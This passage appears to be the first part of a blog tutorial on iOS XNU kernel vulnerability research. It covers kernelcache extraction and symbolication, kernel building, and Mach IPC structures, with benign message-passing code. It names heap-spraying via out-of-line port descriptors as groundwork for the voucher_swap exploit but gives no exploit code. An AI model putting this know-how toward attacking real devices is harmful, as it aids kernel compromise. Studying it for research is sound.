<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">param</span><span class="p">.</span><span class="n">c</span>

    <span class="mi">27285</span><span class="o">:</span>    <span class="mi">83</span>  <span class="k">struct</span>	<span class="n">timezone</span> <span class="n">tz</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="mi">27286</span><span class="o">:</span>    <span class="mi">84</span>  
    <span class="mi">27287</span><span class="o">:</span>    <span class="mi">85</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">27288</span><span class="o">:</span>    <span class="mi">86</span>  <span class="err">#</span><span class="n">define</span>	<span class="n">NPROC</span> <span class="mi">1000</span>          <span class="cm">/* Account for TOTAL_CORPSES_ALLOWED by making this slightly lower than we can. */</span>
    <span class="mi">27289</span><span class="o">:</span>    <span class="mi">87</span>  <span class="err">#</span><span class="n">define</span>	<span class="n">NPROC_PER_UID</span> <span class="mi">950</span>
    <span class="mi">27290</span><span class="o">:</span>    <span class="p">..</span>
    <span class="mi">27291</span><span class="o">:</span>    <span class="mi">96</span>  <span class="kt">int</span>	<span class="n">maxprocperuid</span> <span class="o">=</span> <span class="n">NPROC_PER_UID</span><span class="p">;</span>
    <span class="mi">27292</span><span class="o">:</span>    <span class="mi">97</span>  
    <span class="mi">27293</span><span class="o">:</span>    <span class="mi">98</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">27294</span><span class="o">:</span>    <span class="mi">99</span>  <span class="kt">int</span> <span class="n">hard_maxproc</span> <span class="o">=</span> <span class="n">NPROC</span><span class="p">;</span>	<span class="cm">/* hardcoded limit -- for embedded the number of processes is limited by the ASID space */</span>
    <span class="mi">27295</span><span class="o">:</span>   <span class="mi">100</span>  <span class="err">#</span><span class="k">else</span></code></pre></figure>

<p>It is possible to identify some vulnerabilities in the kernel by just auditing the source code. Some vulnerabilities can, however, be identified only by compiling the kernel (e.g., voucher_swap) and looking under the BUILD directory, which provides access to MIG generated code. Vulnerabilities that are present in kernel extensions are usually identified by reverse engineering since the Kexts code is not usually open source. Some vulnerabilities might be relevant only on Mac OS while some will be relevant only for iOS.</p>

<h2 id="kernelcache">Kernelcache</h2>

<p>The kernelcache is a single <strong>Mach-O</strong> binary which includes the core kernel along with its kernel extensions. It used to be encrypted until iOS 10, after which Apple surprisingly decided to release the kernelcache unencrypted, citing performance reasons as the primary factor. It can now be easily unpacked and extracted from the IPSW file. Before this, the kernelcache was usually dumped from the memory once a kernel vulnerability was identified, or by getting access to the encryption keys (from theiphonewiki or using a bootrom exploit).</p>

<p>To find the decompressed kernelcache, simple unzip the ipsw file and look for the kernelcache file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prateek:mv iPhone_4.7_P3_12.0_16A366_Restore.ipsw iPhone_4.7_P3_12.0_16A366_Restore.zip
prateek:unzip iPhone_4.7_P3_12.0_16A366_Restore.zip
Archive:  iPhone_4.7_P3_12.0_16A366_Restore.zip
  inflating: Restore.plist
   creating: Firmware/
   creating: Firmware/usr/
   creating: Firmware/usr/local/
  inflating: BuildManifest.plist
   creating: Firmware/AOP/
  inflating: Firmware/AOP/aopfw-t8010aop.im4p
  inflating: Firmware/D201_CallanFirmware.im4p
  ....
  inflating: kernelcache.release.iphone10
  inflating: Firmware/ICE16-3.00.01.Release.plist
  inflating: kernelcache.release.iphone9
  inflating: Firmware/ICE17-2.00.01.Release.plist
   creating: Firmware/Maggie/
</code></pre></div></div>

<p>To list all the kernel extensions and split them into corresponding kext files, you can use <strong>**jtool2</strong>**.</p>

<p><img src="/images/3.png" alt="3" /></p>

<p>IDA detects a kernelcache by its magic value and gives you an option to split the kernelcache into its corresponding kext files as well. You can now reverse these kernel extensions separately in order to find vulnerabilities within them.</p>

<p><img src="/images/5.png" alt="5" /></p>

<p>On a jailbroken iOS device, the decompressed kernelcache can be found under <strong>/System/Library/Caches/com.apple.kernelcaches/kernelcache</strong>. Some jailbreaks use this file in order to find the address of certain symbols and offsets dynamically rather than using hardcoded offsets. An excellent example of this is the Qilin toolkit created by @morpheus.</p>

<h2 id="symbolicating-kernelcache">Symbolicating Kernelcache</h2>

<p>Symbolicating a binary can involve a lot of manual effort. Until iOS 11, the kernelcache used to ship with certain symbols. Since iOS 12, Apple decided to strip the kernelcache of all symbols, but not before mistakingly releasing a beta version with all symbols intact. The IPSW was later removed from the downloads section. The following image shows the symbol count obtained by <strong>jtool2</strong> on an iOS 12 kernelcache (stripped) and the iOS 12 beta kernelcache that was released with all symbols intact.</p>

<p><img src="/images/6.png" alt="6" /></p>

<p>The one kernelcache that was released with symbols was then later used by <strong>jtool2</strong> in creating symbols for the newer iOS kernelcaches. One of the most useful features of <strong>jtool2</strong> is its <strong>analyze</strong> command where you can feed it an iOS 12 kernelcache, and it will spit out the symbols for it.</p>

<p><img src="/images/7.png" alt="7" /></p>

<p>As we can see, the companion file generated has about 12000 symbols.</p>

<p><img src="/images/8.png" alt="8" /></p>

<p>In case you have the $$$, one of the easiest ways is to use the Lumina feature introduced with IDA 7.2 to get the symbols.</p>

<h2 id="building-the-kernel">Building the Kernel</h2>

<p>Building the kernel is quite important in finding vulnerabilities. In fact, the bug that we are discussing here (voucher_swap) wouldn’t have been identified with just a source code review of the xnu kernel. It’s a little complicated to build the kernel because of the dependencies and the reliance on the built version to be the same version of the host machine, but a quick google search will land you on many articles with step by step instruction to compile the kernel including <a href="https://gist.github.com/bazad/654959120a423b226dc564073b435453">this</a> automation script written by @_bazad for XNU version 4570.1.46 (MacOS High Sierra 10.13). We will look into the actual vulnerability in Part 2 where we will look into the vulnerable source code present in one of the MIG generated files.</p>

<h2 id="mach-messaging">Mach Messaging</h2>

<p>One of the unique features of the XNU kernel is its extensive use of <strong>Mach IPC</strong>, which is derived from the Mach microkernel, and is easily one of the fastest IPC mechanisms developed till date. A lot of the frequently used IPC mechanisms on iOS such as XPC still use Mach messaging under the hood. Here are some essential points about Mach messaging.</p>

<ul>
  <li>Mach IPC is based on unidirectional communication</li>
  <li>Communication in Mach IPC happens between Ports (endpoints) in the form of Mach messages. Mach messages can be simple or complex, depending on a certain bit set in the message header.</li>
  <li>In order to send messages, you must have an associated port right to it. The same applies for receiving a message, in order to receive a message, you must have a receive right to the port. The different types of rights are
    <ul>
      <li><strong>MACH_PORT_RIGHT_SEND</strong> - Send right to a port allowing unlimited messages</li>
      <li><strong>MACH_PORT_RIGHT_RECEIVE</strong> - Receive rights to a port</li>
      <li><strong>MACH_PORT_RIGHT_SEND_ONCE</strong> - Send right allowing only one message to a port</li>
      <li><strong>MACH_PORT_RIGHT_PORT_SET</strong> - A set of rights to a port</li>
      <li><strong>MACH_PORT_RIGHT_DEAD_NAME</strong> - If the receiver dies, then the SEND right to it becomes MACH_PORT_RIGHT_DEAD_NAME. The same applies when the sender has SEND_ONCE to the port and one message gets sent.</li>
    </ul>
  </li>
  <li>Mach Port rights can be embedded and sent over Mach messages.</li>
  <li>There can be multiple <strong>SEND</strong> rights but only one <strong>RECEIVE</strong> right for a PORT. SEND rights can also be cloned whereas RECEIVE rights cannot.</li>
  <li>When Mach messages are sent, they are held in a queue in the kernel unless received by the receiver. This technique has been used in the past for <strong>Heap-feng-shui</strong>.</li>
  <li>One of the most important binaries in iOS is launchd, which acts as the bootstrap server and allows processes to communicate with each other. launchd can help one process look up another process since all the processes check in with launchd and register themselves once they boot up. Consequently, launchd can also implement throttling and allow or deny lookup in certain situations, thereby acting as a security control. The importance of launchd cannot be underestimated and hence it is the first daemon to be launched (PID 1) and any crash in launchd would immediately trigger a kernel panic.</li>
  <li>Messages are sent and received by threads within a process, which acts as the execution unit within a process. However, the port right is held on a task level, and is mentioned in the task’s <strong>ipc_space</strong> (discussed later)</li>
</ul>

<p>Let’s have a look at the kernel to find the Mach IPC related code. Navigate to <strong>xnu-4903.221.1/osfmk/mach/message.h</strong>. As discussed before, messages can be simple or complex in nature. In the image below, you can see the structure of a simple mach message (<strong>mach_msg_base_t</strong>), which includes a header(<strong>mach_msg_header_t</strong>) and a body(<strong>mach_msg_body_t</strong>). However, for a simple message, the body is ignored by the kernel.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">397</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">398</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">399</span><span class="o">:</span>         <span class="n">mach_msg_size_t</span> <span class="n">msgh_descriptor_count</span><span class="p">;</span>
    <span class="mi">400</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_body_t</span><span class="p">;</span>
    <span class="mi">401</span><span class="o">:</span> 
    <span class="mi">402</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_BODY_NULL</span> <span class="p">(</span><span class="n">mach_msg_body_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">403</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_DESCRIPTOR_NULL</span> <span class="p">(</span><span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">404</span><span class="o">:</span> 
    <span class="mi">405</span><span class="o">:</span> <span class="k">typedef</span>	<span class="k">struct</span> 
    <span class="mi">406</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">407</span><span class="o">:</span>   <span class="n">mach_msg_bits_t</span>	<span class="n">msgh_bits</span><span class="p">;</span>
    <span class="mi">408</span><span class="o">:</span>   <span class="n">mach_msg_size_t</span>	<span class="n">msgh_size</span><span class="p">;</span>
    <span class="mi">409</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_local_port</span><span class="p">;</span>
    <span class="mi">411</span><span class="o">:</span>   <span class="n">mach_port_name_t</span>	<span class="n">msgh_voucher_port</span><span class="p">;</span>
    <span class="mi">412</span><span class="o">:</span>   <span class="n">mach_msg_id_t</span>		<span class="n">msgh_id</span><span class="p">;</span>
    <span class="mi">413</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_header_t</span><span class="p">;</span>
    <span class="mi">414</span><span class="o">:</span> 
    <span class="mi">415</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">msgh_reserved</span>		<span class="n">msgh_voucher_port</span>
    <span class="mi">416</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_NULL</span>	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">417</span><span class="o">:</span> 
    <span class="mi">418</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">419</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">420</span><span class="o">:</span>         <span class="n">mach_msg_header_t</span>       <span class="n">header</span><span class="p">;</span>
    <span class="mi">421</span><span class="o">:</span>         <span class="n">mach_msg_body_t</span>         <span class="n">body</span><span class="p">;</span>
    <span class="mi">422</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_base_t</span><span class="p">;</span></code></pre></figure>

<p>The mach message header structure has the following attributes.</p>

<ul>
  <li><strong>msgh_bits</strong>: It’s a bitmap containing various properties of the message, such as whether the message is simple or complex, the action to be performed (such as moving or copying port rights). The complete logic can be found in <strong>osfmk/mach/message.h</strong></li>
  <li><strong>msgh_size</strong>: Size of (header + body)</li>
  <li><strong>msgh_remote_port</strong>: Send right to the destination port</li>
  <li><strong>msgh_local_port</strong>: Receive right to the port where message needs to be received</li>
  <li><strong>msgh_voucher_port</strong>: Vouchers are used to pass arbitrary data in messages over key-value pairs</li>
  <li><strong>msgh_id</strong>: An arbitrary 32-bit field</li>
</ul>

<p>Complex messages are specified with the complex bit set to 1 in the <strong>msgh_bits</strong> as defined in message.h</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">132</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_ZERO</span>		<span class="mh">0x00000000</span>
    <span class="mi">133</span><span class="o">:</span> 
    <span class="mi">134</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_REMOTE_MASK</span>	<span class="mh">0x0000001f</span>
    <span class="mi">135</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_LOCAL_MASK</span>	<span class="mh">0x00001f00</span>
    <span class="mi">136</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_VOUCHER_MASK</span>	<span class="mh">0x001f0000</span>
    <span class="mi">137</span><span class="o">:</span> 
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">MACH_MSGH_BITS_PORTS_MASK</span>		\
    <span class="mi">139</span><span class="o">:</span> 		<span class="p">(</span><span class="n">MACH_MSGH_BITS_REMOTE_MASK</span> <span class="o">|</span>	\
    <span class="mi">140</span><span class="o">:</span> 		 <span class="n">MACH_MSGH_BITS_LOCAL_MASK</span> <span class="o">|</span>	\
    <span class="mi">141</span><span class="o">:</span> 		 <span class="n">MACH_MSGH_BITS_VOUCHER_MASK</span><span class="p">)</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span>		<span class="mh">0x80000000U</span>	<span class="cm">/* message is complex */</span>
    <span class="mi">144</span><span class="o">:</span> 
    <span class="mi">145</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_USER</span>             <span class="mh">0x801f1f1fU</span>	<span class="cm">/* allowed bits user-&gt;kernel */</span>
    <span class="mi">146</span><span class="o">:</span> 
    <span class="mi">147</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">MACH_MSGH_BITS_RAISEIMP</span>		<span class="mh">0x20000000U</span>	<span class="cm">/* importance raised due to msg */</span>
    <span class="mi">148</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSGH_BITS_DENAP</span>		<span class="n">MACH_MSGH_BITS_RAISEIMP</span></code></pre></figure>

<p>It also contains certain descriptors in addition to the header, and the number of descriptors is specified in the body (<strong>msgh_descriptor_count</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">388</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">union</span>
    <span class="mi">389</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">390</span><span class="o">:</span>   <span class="n">mach_msg_port_descriptor_t</span>		<span class="n">port</span><span class="p">;</span>
    <span class="mi">391</span><span class="o">:</span>   <span class="n">mach_msg_ool_descriptor_t</span>		<span class="n">out_of_line</span><span class="p">;</span>
    <span class="mi">392</span><span class="o">:</span>   <span class="n">mach_msg_ool_ports_descriptor_t</span>	<span class="n">ool_ports</span><span class="p">;</span>
    <span class="mi">393</span><span class="o">:</span>   <span class="n">mach_msg_type_descriptor_t</span>		<span class="n">type</span><span class="p">;</span>
    <span class="mi">394</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_descriptor_t</span><span class="p">;</span>
    <span class="mi">395</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">396</span><span class="o">:</span> 
    <span class="mi">397</span><span class="o">:</span> <span class="k">typedef</span> <span class="k">struct</span>
    <span class="mi">398</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">399</span><span class="o">:</span>         <span class="n">mach_msg_size_t</span> <span class="n">msgh_descriptor_count</span><span class="p">;</span>
    <span class="mi">400</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_body_t</span><span class="p">;</span>
    <span class="mi">401</span><span class="o">:</span> 
    <span class="mi">402</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_BODY_NULL</span> <span class="p">(</span><span class="n">mach_msg_body_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">403</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">MACH_MSG_DESCRIPTOR_NULL</span> <span class="p">(</span><span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span>
    <span class="mi">404</span><span class="o">:</span> 
    <span class="mi">405</span><span class="o">:</span> <span class="k">typedef</span>	<span class="k">struct</span> 
    <span class="mi">406</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">407</span><span class="o">:</span>   <span class="n">mach_msg_bits_t</span>	<span class="n">msgh_bits</span><span class="p">;</span>
    <span class="mi">408</span><span class="o">:</span>   <span class="n">mach_msg_size_t</span>	<span class="n">msgh_size</span><span class="p">;</span>
    <span class="mi">409</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span>   <span class="n">mach_port_t</span>		<span class="n">msgh_local_port</span><span class="p">;</span>
    <span class="mi">411</span><span class="o">:</span>   <span class="n">mach_port_name_t</span>	<span class="n">msgh_voucher_port</span><span class="p">;</span>
    <span class="mi">412</span><span class="o">:</span>   <span class="n">mach_msg_id_t</span>		<span class="n">msgh_id</span><span class="p">;</span>
    <span class="mi">413</span><span class="o">:</span> <span class="p">}</span> <span class="n">mach_msg_header_t</span><span class="p">;</span>
    <span class="mi">414</span><span class="o">:</span> </code></pre></figure>

<p>The <strong>mach_msg_type_descriptor_t</strong> field specifies what type of descriptor it is, and the other fields contains the corresponding data. The following types of descriptors are present:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * In a complex mach message, the mach_msg_header_t is followed by 
     * a descriptor count, then an array of that number of descriptors 
     * (mach_msg_*_descriptor_t). The type field of mach_msg_type_descriptor_t
     * (which any descriptor can be cast to) indicates the flavor of the
     * descriptor.
     *
     * Note that in LP64, the various types of descriptors are no longer all
     * the same size as mach_msg_descriptor_t, so the array cannot be indexed 
     * as expected.
     */</span>

    <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mach_msg_descriptor_type_t</span><span class="p">;</span>

    <span class="cp">#define MACH_MSG_PORT_DESCRIPTOR 		0
</span>    <span class="cp">#define MACH_MSG_OOL_DESCRIPTOR  		1
</span>    <span class="cp">#define MACH_MSG_OOL_PORTS_DESCRIPTOR 		2
</span>    <span class="cp">#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3
</span>
    <span class="cp">#pragma pack(4)
</span>
    <span class="k">typedef</span> <span class="k">struct</span>
    <span class="p">{</span>
      <span class="n">natural_t</span>			<span class="n">pad1</span><span class="p">;</span>
      <span class="n">mach_msg_size_t</span>		<span class="n">pad2</span><span class="p">;</span>
      <span class="kt">unsigned</span> <span class="kt">int</span>			<span class="n">pad3</span> <span class="o">:</span> <span class="mi">24</span><span class="p">;</span>
      <span class="n">mach_msg_descriptor_type_t</span>	<span class="n">type</span> <span class="o">:</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">mach_msg_type_descriptor_t</span><span class="p">;</span></code></pre></figure>

<ul>
  <li><strong>MACH_MSG_PORT_DESCRIPTOR</strong>: Sending a port in a message</li>
  <li><strong>MACH_MSG_OOL_DESCRIPTOR</strong>: Sending OOL data in a message</li>
  <li><strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>: Sending OOL ports array in a message</li>
  <li><strong>MACH_MSG_OOL_VOLATILE_DESCRIPTOR</strong>: Sending volatile data in a message</li>
</ul>

<p>The OOL (Out-of-line) Ports descriptor has been used extensively in spraying the heap with user-controlled data. Whenever <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong> is used, it allocates (kalloc) an array in the kernel heap with all the port pointers. This technique was used in the voucher_swap exploit and will be discussed in Part 2 of this series.</p>

<p>Ports are represented by <strong>mach_port_t</strong> or <strong>mach_port_name_t</strong> in userland, but not in the kenrel, and this is why it is important to understand the difference between them when used in exploits. <strong>mach_port_name_t</strong> represents the local namespace identity but without associating any port rights, and it is essentially meaningless outside of the task’s namespace. However, whenever a process receives a <strong>mach_port_t</strong> from the kernel, it maps the associated port rights to the receiver, whereas in case of <strong>mach_port_name_t</strong> this is not the case. <strong>mach_port_t</strong> will usually always have at least one right, which could be <strong>**RECEIVE</strong>, <strong>SEND</strong> or SEND_ONCE<strong>. This is the reason when we are referring to the kernel task port in exploits; we use mach_port_t because it does associate the port rights with the object. Obtaining a handle to **mach_port_t</strong> automatically creates the associated send rights in the caller’s namespace.</p>

<p>In order to send or receive a message, the <strong>mach_msg</strong> and <strong>mach_msg_overwrite</strong> APIs can be used as defined in <strong>osfmk/mach/message.h</strong>. Let’s have a look at some code samples to get a better understanding. The following code snippet shows the creation of a mach port using the <strong>mach_port_allocate</strong> API and getting a receive right to that port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">//Initialize a Port</span>
    <span class="n">mach_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">kern_return_t</span> <span class="n">err</span><span class="p">;</span>
    <span class="c1">//Allocate the port and get a receive right</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_port_allocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">MACH_PORT_RIGHT_RECEIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">port</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to Allocate a port </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>The message can then be sent using the <strong>mach_msg</strong> Mach trap.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="k">typedef</span> <span class="k">struct</span>
    <span class="p">{</span>
    	<span class="n">mach_msg_header_t</span> <span class="n">header</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">body</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="p">}</span> <span class="n">message</span>

    <span class="k">struct</span> <span class="n">message</span> <span class="n">message</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">message</span><span class="p">.</span><span class="n">body</span><span class="p">,</span> <span class="s">"Hello World !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_remote_port</span> <span class="o">=</span> <span class="n">port</span><span class="p">;</span> <span class="cm">/*Destination Port*/</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_local_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">=</span> <span class="n">MACH_MSGH_BITS</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_msg</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">,</span>			<span class="cm">/* The header */</span>
    	    	  <span class="n">MACH_SEND_MSG</span><span class="p">,</span>	<span class="cm">/* Flags */</span>
    		      <span class="k">sizeof</span> <span class="p">(</span><span class="n">message</span><span class="p">),</span>			<span class="cm">/* Send size */</span>
    		      <span class="mi">0</span><span class="p">,</span>			<span class="cm">/* Max receive Size */</span>
    		      <span class="n">port</span><span class="p">,</span>				<span class="cm">/* Receive port */</span>
    		      <span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span>		<span class="cm">/* No timeout */</span>
    		      <span class="n">MACH_PORT_NULL</span><span class="p">);</span>			<span class="cm">/* No notification */</span></code></pre></figure>

<p>And can be received with <strong>mach_msg</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">mach_port_t</span> <span class="n">receive</span><span class="p">;</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_port_allocate</span> <span class="p">(</span><span class="n">mach_task_self</span> <span class="p">(),</span>
           		      	    <span class="n">MACH_PORT_RIGHT_RECEIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">receive</span><span class="p">);</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_msg</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">,</span><span class="cm">/* The header */</span>
          <span class="n">MACH_RCV_MSG</span><span class="p">,</span>	<span class="cm">/* Flags */</span>
          <span class="mi">0</span><span class="p">,</span> <span class="cm">/* Send size */</span>
    	  <span class="k">sizeof</span> <span class="p">(</span><span class="n">message</span><span class="p">),</span><span class="cm">/* Max receive size */</span>
          <span class="n">receive</span><span class="p">,</span>	<span class="cm">/* Receive port */</span>
          <span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span> <span class="cm">/* No timeout */</span>
          <span class="n">MACH_PORT_NULL</span><span class="p">);</span><span class="cm">/* No notification */</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">0959</span><span class="o">:</span> <span class="cm">/*
    0960:  *	Routine:	mach_msg_overwrite
    0961:  *	Purpose:
    0962:  *		Send and/or receive a message.  If the message operation
    0963:  *		is interrupted, and the user did not request an indication
    0964:  *		of that fact, then restart the appropriate parts of the
    0965:  *		operation silently (trap version does not restart).
    0966:  *
    0967:  *		Distinct send and receive buffers may be specified.  If
    0968:  *		no separate receive buffer is specified, the msg parameter
    0969:  *		will be used for both send and receive operations.
    0970:  *
    0971:  *		In addition to a distinct receive buffer, that buffer may
    0972:  *		already contain scatter control information to direct the
    0973:  *		receiving of the message.
    0974:  */</span>
    <span class="mi">0975</span><span class="o">:</span> <span class="n">__WATCHOS_PROHIBITED</span> <span class="n">__TVOS_PROHIBITED</span>
    <span class="mi">0976</span><span class="o">:</span> <span class="k">extern</span> <span class="n">mach_msg_return_t</span>	<span class="nf">mach_msg_overwrite</span><span class="p">(</span>
    <span class="mi">0977</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span>
    <span class="mi">0978</span><span class="o">:</span> 					<span class="n">mach_msg_option_t</span> <span class="n">option</span><span class="p">,</span>
    <span class="mi">0979</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">send_size</span><span class="p">,</span>
    <span class="mi">0980</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_size</span><span class="p">,</span>
    <span class="mi">0981</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">rcv_name</span><span class="p">,</span>
    <span class="mi">0982</span><span class="o">:</span> 					<span class="n">mach_msg_timeout_t</span> <span class="n">timeout</span><span class="p">,</span>
    <span class="mi">0983</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">notify</span><span class="p">,</span>
    <span class="mi">0984</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">rcv_msg</span><span class="p">,</span>
    <span class="mi">0985</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_limit</span><span class="p">);</span>
    <span class="mi">0986</span><span class="o">:</span> 
    <span class="mi">0987</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span>	<span class="n">KERNEL</span>
    <span class="mi">0988</span><span class="o">:</span> 
    <span class="mi">0989</span><span class="o">:</span> <span class="cm">/*
    0990:  *	Routine:	mach_msg
    0991:  *	Purpose:
